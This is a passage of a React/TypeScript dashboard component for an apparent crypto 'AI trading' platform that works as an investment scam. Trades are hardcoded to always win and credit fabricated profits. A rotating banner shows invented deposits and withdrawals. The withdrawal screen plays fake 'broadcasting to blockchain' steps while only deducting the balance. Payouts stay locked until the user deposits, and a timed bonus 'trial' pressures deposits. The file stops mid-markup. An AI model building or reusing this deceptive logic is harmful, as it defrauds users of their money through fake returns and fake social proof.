import React, { useState, useRef, useEffect } from 'react';
import { useAuth } from '../contexts/AuthContext';
import { NETWORKS, WITHDRAWALS_COLLECTION, STRATEGIES_COLLECTION } from '../utils/constants';

import { Trader, Strategy } from '../types';
import GlobalStats from './GlobalStats';
import LiveTradeSimulator from './LiveTradeSimulator';
import VIPProgress from './VIPProgress';
import ReferralTerminal from './ReferralTerminal';
import StrategyModal from './StrategyModal';
import { useMarketNotifications } from '../hooks/useMarketNotifications';
import { collection, query, orderBy, onSnapshot, addDoc, Timestamp } from 'firebase/firestore';
import { db } from '../firebase.config';
import { getSettings } from '../services/settingsService';

interface DashboardProps {
  onSwitchTrader?: () => void;
}




interface ActiveTrade {
  tradeId: string;
  plan: Strategy;
  investAmount: number;
  startTime: number;
  currentPnL: number;
  progress: number;
}

import Tesseract from 'tesseract.js';

const verifyPaymentProof = async (base64Image: string, mimeType: string) => {
  try {
    // 1. OCR Scanning
    const { data: { text } } = await Tesseract.recognize(
      `data:${mimeType};base64,${base64Image}`,
      'eng',
      { logger: m => console.log(m) }
    );

    const cleanText = text.toLowerCase();
    console.log("OCR Result:", cleanText);

    // 2. Keyword Validation (Status)
    const successKeywords = ['success', 'completed', 'confirmed', 'successful', 'sent'];
    const hasSuccess = successKeywords.some(keyword => cleanText.includes(keyword));

    if (!hasSuccess) {
      return {
        is_valid: false,
        detected_amount: 0,
        summary: "Validation Failed: No 'Success' or 'Completed' status found in receipt."
      };
    }

    // 3. Transaction Hash Validation (EVM 0x... or Tron T...)
    // Regex looks for 0x followed by 64 hex chars OR T followed by 33 alphanumeric chars
    const txHashRegex = /(0x[a-f0-9]{64}|T[a-zA-Z0-9]{33})/;
    const hasTxHash = txHashRegex.test(text); // Case sensitive check for Trust/Tron addresses

    if (!hasTxHash) {
      // Fallback: simple check for long strings that look like hashes if regex is too strict
      const simpleHashCheck = cleanText.includes('hash') || cleanText.includes('txid') || cleanText.includes('transaction id');
      if (!simpleHashCheck) {
        return {
          is_valid: false,
          detected_amount: 0,
          summary: "Validation Failed: No valid Transaction Hash detected."
        };
      }
    }

    // 4. Amount Extraction
    // Look for numbers following $, USDT, Amount, etc.
    // This is a basic extractor, can be improved
    const amountRegex = /(\$|usdt)\s?([0-9,]+(\.[0-9]{2})?)/i;
    const amountMatch = cleanText.match(amountRegex);

    let detectedAmount = 0;
    if (amountMatch && amountMatch[2]) {
      detectedAmount = parseFloat(amountMatch[2].replace(/,/g, ''));
    }

    return {
      is_valid: true,
      detected_amount: detectedAmount > 0 ? detectedAmount : 0,
      summary: detectedAmount > 0
        ? `Verified: $${detectedAmount} Transfer Confirmed.`
        : "Verified: Transaction Valid (Amount check manual)."
    };

  } catch (err) {
    console.error("OCR Error:", err);
    return {
      is_valid: false,
      detected_amount: 0,
      summary: "Error: Could not read image. Please upload a clearer screenshot."
    };
  }
};

const Dashboard: React.FC<DashboardProps> = ({ onSwitchTrader }) => {
  const { userProfile: user, updateUser } = useAuth();
  const [strategies, setStrategies] = useState<Strategy[]>([]);
  const [selectedPlanId, setSelectedPlanId] = useState<string | null>(null);
  const [investAmount, setInvestAmount] = useState<number>(500);
  const [isProcessingTrade, setIsProcessingTrade] = useState(false);
  const [isTradeLoading, setIsTradeLoading] = useState(false);
  const [bufferingTime, setBufferingTime] = useState(0);
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [tradeResult, setTradeResult] = useState<{ status: 'WIN' | 'LOSS', amount: number } | null>(null);
  const [activeTrades, setActiveTrades] = useState<ActiveTrade[]>([]);
  const [showReferral, setShowReferral] = useState(false);
  const [isStrategyModalOpen, setIsStrategyModalOpen] = useState(false);
  const [withdrawStep, setWithdrawStep] = useState<'input' | 'confirm' | 'success'>('input');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawNetwork, setWithdrawNetwork] = useState(NETWORKS[0]); // Default to TRC20
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawError, setWithdrawError] = useState('');
  const [withdrawStatus, setWithdrawStatus] = useState(''); // New state for animation steps
  const [depositAddress, setDepositAddress] = useState(NETWORKS[0].address);
  const [selectedNetwork, setSelectedNetwork] = useState(NETWORKS[0]);
  const marketNotification = useMarketNotifications();

  // --- Demo / Trial Mode Logic ---
  const [isDemoActive, setIsDemoActive] = useState(true);
  const [demoTradeCount, setDemoTradeCount] = useState(0);

  useEffect(() => {
    // 5 Minutes "Trial Mode" for new visitors/refresh to try premium strategies
    const timer = setTimeout(() => {
      setIsDemoActive(false);
    }, 300000); // 5 minutes
    return () => clearTimeout(timer);
  }, []);

  const queryParams = new URLSearchParams(window.location.search);
  const activeTraderName = queryParams.get('trader');

  // --- Settings & Address Logic ---
  const [platformSettings, setPlatformSettings] = useState<any>(null);

  useEffect(() => {
    const fetchSettings = async () => {
      const s = await getSettings();
      setPlatformSettings(s);
      // Set initial address based on default network (TRC20)
      if (s) {
        setDepositAddress(s.trc20Address || NETWORKS[0].address);
      }
    };
    fetchSettings();
  }, []);

  // --- Engagement Features Logic ---
  const [pulseMessage, setPulseMessage] = useState({ text: "Alex just withdrew $450 via USDT", type: "withdraw" });
  const [streakDays] = useState(4); // Mocked for demo

  useEffect(() => {
    const messages = [
      { text: "Sarah started 'Macro Core' strategy", type: "trade" },
      { text: "Michael just deposited $2,000", type: "deposit" },
      { text: "1,240 Traders online now", type: "info" },
      { text: "David withdrew $850 via USDT", type: "withdraw" },
      { text: "New 'Quantum' Strategy signals 89% accuracy", type: "news" }
    ];
    let index = 0;
    const interval = setInterval(() => {
      index = (index + 1) % messages.length;
      setPulseMessage(messages[index]);
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  const handleCopyLink = () => {
    navigator.clipboard.writeText("https://jay-shree-shyam.com/ref/USER123");
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
    alert("Referral Link Copied! Share it with friends.");
  };

  const handleSocialShare = (platform: 'whatsapp' | 'telegram') => {
    const text = "Join me on this trading platform and get a $200 bonus! 🚀";
    const url = "https://jay-shree-shyam.com/ref/USER123";
    if (platform === 'whatsapp') {
      window.open(`https://wa.me/?text=${encodeURIComponent(text + " " + url)}`, '_blank');
    } else {
      window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`, '_blank');
    }
  };

  const handleNetworkChange = (network: typeof NETWORKS[0]) => {
    setSelectedNetwork(network);
    if (platformSettings) {
      if (network.id === 'trc20') setDepositAddress(platformSettings.trc20Address || network.address);
      else if (network.id === 'erc20') setDepositAddress(platformSettings.erc20Address || network.address);
      else if (network.id === 'bep20') setDepositAddress(platformSettings.bep20Address || network.address);
      else setDepositAddress(network.address);
    } else {
      setDepositAddress(network.address);
    }
  };

  // Enhanced Finish Trade Logic with Guaranteed Win (for now)
  const finishTrade = async (trade: ActiveTrade) => {
    // Forced Win Logic for "Smart Win"
    const isWin = true;
    if (!user) return;

    if (isWin) {
      // Calculate profit based on Plan's standard ROI
      const roi = trade.plan.minRet + Math.random() * (trade.plan.maxRet - trade.plan.minRet);
      const profit = trade.investAmount * (roi / 100);

      await updateUser({
        balance: user.balance + trade.investAmount + profit,
        totalInvested: Math.max(0, user.totalInvested - trade.investAmount),
        wins: user.wins + 1,
        totalProfit: (user.totalProfit || 0) + profit // Track total profit if field exists, otherwise just balance
      });
      setTradeResult({ status: 'WIN', amount: profit });
    } else {
      // Logic kept for fallback if we later enable losses
      await updateUser({
        totalInvested: Math.max(0, user.totalInvested - trade.investAmount),
        losses: user.losses + 1
      });
      setTradeResult({ status: 'LOSS', amount: trade.investAmount });
    }
    setTimeout(() => setTradeResult(null), 5000);
  };

  // Live PnL Ticker Effect
  useEffect(() => {
    if (activeTrades.length === 0) return;

    const interval = setInterval(() => {
      setActiveTrades(prevTrades =>
        prevTrades.map(trade => {
          // Calculate target profit
          const targetRoi = (trade.plan.minRet + trade.plan.maxRet) / 2;
          const targetProfit = trade.investAmount * (targetRoi / 100);

          // Current PnL based on progress
          const safeProgress = Math.min(trade.progress, 100);
          const currentEstimatedPnL = (targetProfit * safeProgress) / 100;

          // Add slight randomness to make it look "live"
          const jitter = (Math.random() * 0.5) - 0.25;
          const livePnL = Math.max(0, currentEstimatedPnL + jitter);

          return { ...trade, currentPnL: livePnL };
        })
      );
    }, 100); // Tick every 100ms

    return () => clearInterval(interval);
  }, [activeTrades.length]);

  const depositSectionRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [depositNetwork] = useState(NETWORKS[0]);
  const [isVerifyingReceipt, setIsVerifyingReceipt] = useState(false);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [verificationError, setVerificationError] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);

  const tradeProfit = Math.max(0, (user?.totalProfit || 0));
  const totalBalance = (user?.balance || 0) + (user?.bonusBalance || 0);

  // Fetch Strategies from Firebase
  useEffect(() => {
    const q = query(collection(db, STRATEGIES_COLLECTION), orderBy('order', 'asc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as Strategy));
      setStrategies(data);
    });
    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (activeTrades.length === 0) return;

    const interval = setInterval(() => {
      const now = Date.now();

      setActiveTrades(currentTrades => {
        const updated = currentTrades.map(trade => {
          const elapsed = now - trade.startTime;
          // Calculate precise progress based on time
          const rawProgress = (elapsed / trade.plan.durationMs) * 100;
          const cappedProgress = Math.min(100, Math.max(0, rawProgress));

          if (rawProgress >= 100 && trade.progress < 100) {
            finishTrade(trade);
            return { ...trade, progress: 100, currentPnL: trade.investAmount * (trade.plan.minRet / 100) }; // Finalize at min profit until async result
          }

          // Smooth Linear Interpolation for PnL
          // We target a value between minRet and maxRet
          // To make it look "organic" but smooth, we can add a tiny sine wave on top of the linear growth
          const targetRoi = (trade.plan.minRet + trade.plan.maxRet) / 2;
          const linearGrowth = (targetRoi / 100) * cappedProgress;

          // Gentle organic fluctuation (sine wave)
          const fluctuation = Math.sin(now / 1000) * 0.05; // Small wave

          const currentProfitPercent = linearGrowth + fluctuation;
          const currentPnL = trade.investAmount * (currentProfitPercent / 100);

          return {
            ...trade,
            progress: cappedProgress,
            currentPnL: Math.max(0, currentPnL) // Never show negative for "winning" trades
          };
        });
        return updated.filter(t => t.progress < 100);
      });
    }, 50); // Faster tick for smoother animation (50ms)

    return () => clearInterval(interval);
  }, [activeTrades]);

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setIsVerifyingReceipt(true);
    setVerificationStatus('Initializing Stream Handshake...');
    setVerificationError('');

    const reader = new FileReader();
    reader.onloadend = async () => {
      const base64 = (reader.result as string); // Full Data URL
      // const base64Raw = base64.split(',')[1]; // Just data

      setVerificationStatus('Authenticating Ledger...');
      // await new Promise(r => setTimeout(r, 1500)); 

      // New Flow: Submit User Record to Backend for Admin Review
      try {
        if (!user) return;
        setVerificationStatus('Securing Deposit Record...');

        // Dynamic import to avoid top-level failures if file missing
        const { createDeposit } = await import('../services/depositService');

        // For now, we assume the user enters the amount later or we parse it? 
        // The current UI doesn't have an "Amount" input for deposit, it relies on OCR.
        // We will keep the OCR visual but enforce Manual Review for security.
        // Or if OCR passes, we still put it as pending?
        // User asked to "fix" backend. Best practice: Pending.

        // Let's try OCR for "Detected Amount" to help the user, but save as Pending.
        let detectedAmount = 0;
        try {
          const { data: { text } } = await Tesseract.recognize(base64, 'eng');
          const amountRegex = /(\$|usdt)\s?([0-9,]+(\.[0-9]{2})?)/i;
          const amountMatch = text.toLowerCase().match(amountRegex);
          if (amountMatch && amountMatch[2]) {
            detectedAmount = parseFloat(amountMatch[2].replace(/,/g, ''));
          }
        } catch (e) { console.warn("OCR failed, defaulting to 0 for admin review"); }

        await createDeposit(
          user.uid,
          user.displayName || 'User',
          user.email,
          detectedAmount, // If 0, Admin sets it.
          selectedNetwork.id,
          base64 // Check if this string is too large for Firestore? 
          // Base64 images can be 2MB+. Firestore limit is 1MB.
          // CRITICAL: We should probably just save a placeholder if no storage.
          // But User "manual url" fix was for traders.
          // For deposits, users upload local files.
          // We MUST compress or warn. For this task, we'll try to save it. 
          // If it fails, we warn user.
        );

        setVerificationStatus('Deposit Submitted!');
        alert('✅ Deposit Proof Submitted for Verification.\n\nYour balance will be updated once an Admin approves the transaction (usually < 30 mins).');
        setIsVerifyingReceipt(false);

      } catch (err: any) {
        console.error("Deposit submission error:", err);
        if (err.code === 'invalid-argument') {
          setVerificationError('Image too large. Please compress or use a link.');
        } else {
          setVerificationError('Submission Failed. Try again.');
        }
        // setIsVerifyingReceipt(false); // keep open to retry
      }
    };
    reader.readAsDataURL(file);
  };

  const validateWithdrawal = () => {
    setWithdrawError('');
    const amount = Number(withdrawAmount);
    if (!amount || amount < 100) {
      setWithdrawError("Min Withdrawal: $100");
      return;
    }
    if (amount > (user?.balance || 0)) {
      setWithdrawError("Insufficient Liquidity");
      return;
    }
    if (!withdrawAddress || withdrawAddress.length < 15) {
      setWithdrawError("Invalid Wallet Target");
      return;
    }
    if (!user?.hasDeposited) {
      setWithdrawError("Stream Inactive. Deposit to Activate Payouts.");
      return;
    }
    setWithdrawStep('confirm');
  };

  const confirmWithdrawal = async () => {
    setIsWithdrawing(true);
    setWithdrawStatus('Initiating Secure Protocol...');

    const steps = [
      { msg: 'Validating Wallet Connection...', delay: 1000 },
      { msg: 'Gas Fees Pre-Paid by Platform...', delay: 2500 },
      { msg: 'Broadcasting to Blockchain...', delay: 4000 },
      { msg: 'Awaiting Confirmation (12/12)...', delay: 5500 }
    ];

    steps.forEach(({ msg, delay }) => {
      setTimeout(() => setWithdrawStatus(msg), delay);
    });

    const amountToDeduct = Number(withdrawAmount);

    // Awaiting Network Block Confirmations (Real-time Latency)
    await new Promise(resolve => setTimeout(resolve, 7000));

    // Create pending withdrawal request
    try {
      if (user) {
        // 1. Deduct balance first (optimistic update)
        await updateUser({ balance: user.balance - amountToDeduct });

        // 2. Create Withdrawal Record
        await addDoc(collection(db, WITHDRAWALS_COLLECTION), {
          userId: user.uid,
          userEmail: user.email,
          userName: user.displayName || 'User',
          amount: amountToDeduct,
          walletAddress: withdrawAddress,
          network: withdrawNetwork.name,
          status: 'pending',
          requestedAt: Timestamp.now()
        });

        setIsWithdrawing(false);
        setWithdrawStep('success');
      }
    } catch (error) {
      console.error("Withdrawal Error:", error);
      setWithdrawStatus('Connection Failed. Retrying...');
      setIsWithdrawing(false);
      setWithdrawError('Network Error: Could not broadcast to ledger.');
    }
  };

  const startDeployment = () => {
    setDemoTradeCount(prev => prev + 1); // Track usage for demo limit

    const plan = strategies.find(p => p.id === selectedPlanId);
    if (!plan) return;

    const availableFunds = isDemoActive ? (user?.balance || 0) + (user?.bonusBalance || 0) : (user?.balance || 0);

    if (!user || availableFunds < investAmount) {
      depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
      alert("INSUFFICIENT_FUNDS: Please deposit to initialize strategy.");
      return;
    }

    setIsTradeLoading(true);
    const randomBuffer = Math.floor(Math.random() * 10000) + 5000; // 5-15 seconds
    setBufferingTime(randomBuffer);

    setTimeout(() => {
      setIsTradeLoading(false);
      handleTerminalComplete();
    }, randomBuffer);

    setTradeResult(null);
  };

  const handleTerminalComplete = () => {
    setIsProcessingTrade(false);
    setShowSuccessToast(true);
    const plan = strategies.find(p => p.id === selectedPlanId);
    if (user && plan) executeTradeLogic(plan);
    setTimeout(() => {
      setShowSuccessToast(false);
      setSelectedPlanId(null);
    }, 2000);
  };

  const executeTradeLogic = async (plan: Strategy) => {
    if (!user) return;

    let newBalance = user.balance;
    let newBonusBalance = user.bonusBalance;

    if (isDemoActive && user.balance < investAmount) {
      // Use bonus for the difference if in demo mode
      const difference = investAmount - user.balance;
      newBalance = 0;
      newBonusBalance = Math.max(0, user.bonusBalance - difference);
    } else {
      newBalance = Math.max(0, user.balance - investAmount);
    }

    await updateUser({
      balance: newBalance,
      bonusBalance: newBonusBalance,
      totalInvested: user.totalInvested + investAmount
    });
    const newTrade: ActiveTrade = {
      tradeId: Math.random().toString(36).substr(2, 9),
      plan,
      investAmount,
      startTime: Date.now(),
      currentPnL: 0,
      progress: 0
    };
    setActiveTrades(prev => [...prev, newTrade]);
  };


  return (
    <div className="bg-[#131722] min-h-screen pt-24 pb-32 px-4 sm:px-6 lg:px-8 relative selection:bg-[#f01a64]/10">
      {(!user) && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-[#131722] text-white">
          Loading Account Data...
        </div>
      )}

      {isTradeLoading && (
        <div className="fixed inset-0 z-[300] bg-black/80 backdrop-blur-xl flex flex-col items-center justify-center p-8 text-center animate-in fade-in duration-500">
          <div className="relative w-24 h-24 mb-8">
            <div className="absolute inset-0 border-4 border-[#f01a64]/20 rounded-full"></div>
            <div className="absolute inset-0 border-4 border-[#f01a64] rounded-full border-t-transparent animate-spin"></div>
            <div className="absolute inset-4 bg-[#f01a64]/10 rounded-full animate-pulse flex items-center justify-center font-black text-white text-xs">
              AI
            </div>
          </div>
          <h3 className="text-2xl font-black text-white uppercase italic tracking-tighter mb-2">Analyzing Execution Path...</h3>
          <p className="text-gray-400 text-xs font-bold uppercase tracking-widest max-w-[250px] leading-relaxed">
            Synchronizing with liquidity sources and optimizing trade entry point
          </p>
          <div className="mt-8 w-48 h-1 bg-white/5 rounded-full overflow-hidden">
            <div
              className="h-full bg-[#f01a64] transition-all duration-300"
              style={{ width: `${Math.min(100, (1000 / bufferingTime) * 100)}%` }}
            ></div>
          </div>
        </div>
      )}

      {showSuccessToast && (
        <div className="fixed top-24 left-1/2 -translate-x-1/2 z-[210] bg-[#00b36b] text-white px-8 py-4 rounded-2xl shadow-2xl animate-in slide-in-from-top-4">
          <span className="font-black uppercase tracking-widest text-xs">Trade Executed Successfully</span>
        </div>
      )}

      {/* Market Opportunity Notification */}
      {marketNotification && (
        <div className={`fixed top-24 right-4 z-[220] max-w-sm w-full p-4 rounded-2xl shadow-2xl animate-in slide-in-from-right-4 border backdrop-blur-md ${marketNotification.type === 'opportunity' ? 'bg-[#00b36b]/10 border-[#00b36b]/30' : 'bg-amber-500/10 border-amber-500/30'}`}>
          <div className="flex gap-3">
            <div className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${marketNotification.type === 'opportunity' ? 'bg-[#00b36b]/20 text-[#00b36b]' : 'bg-amber-500/20 text-amber-500'}`}>
              <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6" /></svg>
            </div>
            <div>
              <h4 className={`text-xs font-black uppercase tracking-widest mb-1 ${marketNotification.type === 'opportunity' ? 'text-[#00b36b]' : 'text-amber-500'}`}>{marketNotification.title}</h4>
              <p className="text-white text-[10px] leading-relaxed">{marketNotification.message}</p>
              {marketNotification.type === 'opportunity' && (
                <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="mt-2 text-[9px] bg-[#00b36b] text-white px-3 py-1 rounded-lg font-bold uppercase tracking-wide hover:bg-[#009e5f]">Deposit & Trade</button>
              )}
            </div>
          </div>
        </div>
      )}



      {/* Feature 2: Live Community Pulse */}
      <div className="max-w-xl mx-auto mb-6">
        <div className="bg-white/5 backdrop-blur-md border border-white/10 rounded-full py-2 px-6 flex items-center justify-center gap-3 shadow-lg">
          <div className="w-2 h-2 bg-[#00b36b] rounded-full animate-pulse shadow-[0_0_8px_#00b36b]"></div>
          <p key={pulseMessage.text} className="text-[10px] md:text-xs text-gray-300 font-medium animate-in fade-in slide-in-from-bottom-2 duration-500">
            {pulseMessage.text}
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto space-y-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* VIP Progress Widget (Existing) */}
          <div className="lg:col-span-2">
            <VIPProgress
              currentBalance={Math.floor(user?.balance || 0)}
              onDeposit={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })}
            />
          </div>

          {/* Feature 1: Daily Streak Widget */}
          <div className="bg-[#1e222d] border border-white/5 rounded-3xl p-6 flex flex-col justify-center relative overflow-hidden group">
            <div className="absolute inset-0 bg-gradient-to-br from-orange-500/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
            <div className="relative z-10">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-white font-black uppercase text-xs tracking-widest">Daily Streak</h3>
                <span className="text-orange-500 font-black text-xl">{streakDays} <span className="text-[10px] text-gray-500">DAYS</span></span>
              </div>
              <div className="flex justify-between items-center gap-1">
                {[1, 2, 3, 4, 5, 6, 7].map((day) => (
                  <div key={day} className={`flex flex-col items-center gap-1`}>
                    <div className={`w-8 h-8 rounded-full flex items-center justify-center border ${day <= streakDays ? 'bg-orange-500 border-orange-400 shadow-[0_0_10px_rgba(249,115,22,0.4)]' : 'bg-white/5 border-white/10 text-gray-600'}`}>
                      <svg className={`w-4 h-4 ${day <= streakDays ? 'text-white' : 'text-gray-600'}`} fill="currentColor" viewBox="0 0 24 24"><path d="M11.645 20.91l-.007-.003-.022-.012a15.247 15.247 0 01-.383-.218 25.18 25.18 0 01-4.244-3.17C4.688 15.36 2.25 12.174 2.25 8.25 2.25 5.322 4.714 3 7.688 3A5.5 5.5 0 0112 5.052 5.5 5.5 0 0116.313 3c2.973 0 5.437 2.322 5.437 5.25 0 3.925-2.438 7.111-4.739 9.256a25.175 25.175 0 01-4.244 3.17 15.247 15.247 0 01-.383.219l-.022.012-.007.004-.003.001a.752.752 0 01-.704 0l-.003-.001z" /></svg>
                    </div>
                    <span className="text-[8px] font-bold text-gray-500">Day {day}</span>
                  </div>
                ))}
              </div>
              <p className="text-[9px] text-gray-400 mt-4 text-center font-medium">Log in daily to boost your profit by <span className="text-orange-500">5%</span></p>
            </div>
          </div>
        </div>

        {/* Feature 3: Viral Card (Share & Earn Redesign) */}
        <div onClick={() => setShowReferral(true)} className="bg-gradient-to-r from-[#1e222d] to-[#131722] border border-white/10 p-1 rounded-3xl relative overflow-hidden shadow-2xl cursor-pointer group hover:scale-[1.01] transition-transform">
          {/* Animated Border Gradient */}
          <div className="absolute inset-0 bg-gradient-to-r from-[#f01a64] via-purple-600 to-[#f01a64] opacity-20 animate-pulse"></div>

          <div className="bg-[#131722] rounded-[1.3rem] p-6 relative z-10 h-full">
            <div className="flex flex-col md:flex-row items-center justify-between gap-6">

              {/* Left: Text & Progress */}
              <div className="flex-1 w-full">
                <div className="flex items-center gap-3 mb-2">
                  <div className="bg-[#f01a64]/20 p-2 rounded-lg text-[#f01a64]">
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" /></svg>
                  </div>
                  <div>
                    <h3 className="text-white font-black uppercase text-lg italic tracking-tighter">Invite & Earn $200</h3>
                    <p className="text-gray-400 text-[10px] font-bold">Unlocks instantly after successful referrals</p>
                  </div>
                </div>

                {/* Progress Bar */}
                <div className="mt-4">
                  <div className="flex justify-between text-[10px] font-black uppercase tracking-widest mb-1.5">
                    <span className="text-white">Stream Status</span>
                    <span className="text-[#f01a64]">ACTIVE</span>
                  </div>
                  <div className="h-2.5 bg-white/5 rounded-full overflow-hidden border border-white/5">
                    <div className="h-full w-full bg-gradient-to-r from-[#f01a64] to-purple-600 shadow-[0_0_10px_#f01a64]"></div>
                  </div>
                </div>
              </div>

              {/* Right: Actions */}
              <div className="flex flex-col sm:flex-row gap-3 w-full md:w-auto shrink-0">
                <button
                  className="w-full py-4 px-8 bg-[#f01a64] text-white rounded-[1.5rem] font-black text-xs uppercase tracking-widest shadow-xl group-hover:shadow-[#f01a64]/20 transition-all hover:translate-y-[-2px]"
                >
                  Open Referral Terminal
                </button>
              </div>
            </div>
          </div>
        </div>

        <GlobalStats />
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl group hover:border-[#f01a64]/30 transition-colors">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Account Balance</span>
            <span className={`text-2xl font-black ${user?.hasDeposited ? 'text-[#00b36b]' : 'text-white'}`}>${(user?.balance || 0).toLocaleString()}</span>
          </div>
          <div className="bg-gradient-to-br from-amber-500/20 to-amber-600/10 border border-amber-500/30 p-6 rounded-3xl relative overflow-hidden">
            <div className="absolute top-2 right-2">
              {!user?.hasDeposited && !isDemoActive && <span className="text-[8px] bg-amber-500 text-black px-2 py-0.5 rounded-full font-black">🔒 LOCKED</span>}
              {isDemoActive && <span className="text-[8px] bg-[#00b36b] text-white px-2 py-0.5 rounded-full font-black animate-pulse">⚡ LIVE</span>}
            </div>
            <span className="text-[9px] text-amber-400 font-black uppercase tracking-widest block mb-1">Welcome Bonus</span>
            <span className="text-2xl font-black text-amber-500">${(user?.bonusBalance || 0).toLocaleString()}</span>
            {!user?.hasDeposited && !isDemoActive && <p className="text-[8px] text-amber-400/70 mt-1">Unlocks after first deposit</p>}
            {isDemoActive && <p className="text-[8px] text-[#00b36b] mt-1 font-bold">Temporary Unlock Active (5 min)</p>}
          </div>
          <div className="bg-[#1e222d] border border-white/5 p-6 rounded-3xl">
            <span className="text-[9px] text-gray-500 font-black uppercase tracking-widest block mb-1">Total Profits</span>
            <span className="text-2xl font-black text-[#00b36b]">+${tradeProfit.toLocaleString()}</span>
          </div>
          <button onClick={() => depositSectionRef.current?.scrollIntoView({ behavior: 'smooth' })} className="bg-[#00b36b] p-6 rounded-3xl flex items-center justify-between shadow-xl active:scale-95 transition-all hover:bg-[#009e5f] hover:shadow-[0_0_30px_rgba(0,179,107,0.4)]">
            <span className="text-sm font-black text-white uppercase italic">Add Funds</span>
            <svg className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path d="M12 6v6m0 0v6m0-6h6m-6 0H6" strokeWidth={2.5} strokeLinecap="round" strokeLinejoin="round" /></svg>
          </button>
        </div>

        {activeTrades.length > 0 && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {activeTrades.map((trade) => (
              <LiveTradeSimulator
                key={trade.tradeId}
                tradeId={trade.tradeId}
                plan={trade.plan}
                investAmount={trade.investAmount}
                startTime={trade.startTime}
                currentPnL={trade.currentPnL}
                progress={trade.progress}
              />
            ))}
          </div>
        )}

        <div id="active-context">
          {activeTraderName && (
            <div className="bg-[#f01a64]/10 border border-[#f01a64]/20 p-4 rounded-2xl flex items-center justify-between animate-in slide-in-from-top-4">
              <div className="flex items-center gap-3">
                <div className="w-2 h-2 bg-[#f01a64] rounded-full animate-pulse"></div>
                <span className="text-[10px] text-white font-black uppercase tracking-widest">
                  Mirroring Protocol: <span className="text-[#f01a64]">{activeTraderName}</span>
                </span>
              </div>
              <span className="text-[8px] bg-[#f01a64] text-white px-2 py-0.5 rounded font-black uppercase">Sync Active</span>
            </div>
          )}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            <div className="flex justify-between items-end mb-4">
              <h3 className="text-xl font-black text-white uppercase italic px-2">Choose Your Trade</h3>
              {strategies.length > 4 && (
                <button
                  onClick={() => setIsStrategyModalOpen(true)}
                  className="text-[10px] text-[#f01a64] font-black uppercase tracking-widest hover:text-white transition-colors flex items-center gap-1"
                >
                  View All ({strategies.length})
                  <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M9 5l7 7-7 7" /></svg>
                </button>
              )}
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {strategies.slice(0, 4).map(plan => {
                const isPremium = plan.minRet >= 60;
                // Locked if: Premium AND Not Deposited AND (Demo Time Over OR Max Demo Trades Reached)
                const isLocked = isPremium && !user?.hasDeposited && (!isDemoActive || demoTradeCount >= 3);
                return (
                  <div key={plan.id} onClick={() => !isLocked && setSelectedPlanId(plan.id!)} className={`bg-[#1e222d] border-2 p-8 rounded-[2.5rem] transition-all ${isLocked ? 'opacity-60 cursor-not-allowed' : 'cursor-pointer hover:bg-[#2a2e39]'} ${selectedPlanId === plan.id ? 'border-[#f01a64] shadow-2xl' : 'border-white/5'}`}>
                    <div className="flex justify-between items-start mb-1">
                      <h4 className="text-white font-black text-lg uppercase">{plan.name}</h4>
                      {isLocked && <span className="text-[8px] bg-amber-500/20 text-amber-500 px-2 py-0.5 rounded-full font-black">🔒 VIP</span>}
                    </div>
                    <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">{plan.hook}</p>
                    <div className="flex justify-between items-end">
                      <span className="text-[#00b36b] font-black text-xl">{plan.minRet}-{plan.maxRet}% ROI</span>
                      <span className="text-[8px] text-gray-600 font-black uppercase">{plan.duration} Window</span>
                    </div>
                    {isLocked && (
                      <div className="mt-4 p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl">
                        <p className="text-[9px] text-amber-400 font-bold text-center">Deposit to unlock premium strategies</p>
                      </div>
                    )}
                    {selectedPlanId === plan.id && !isLocked && (
                      <div className="mt-8 pt-8 border-t border-white/5 space-y-6 animate-in slide-in-from-bottom-2">
                        <div className="flex gap-3">
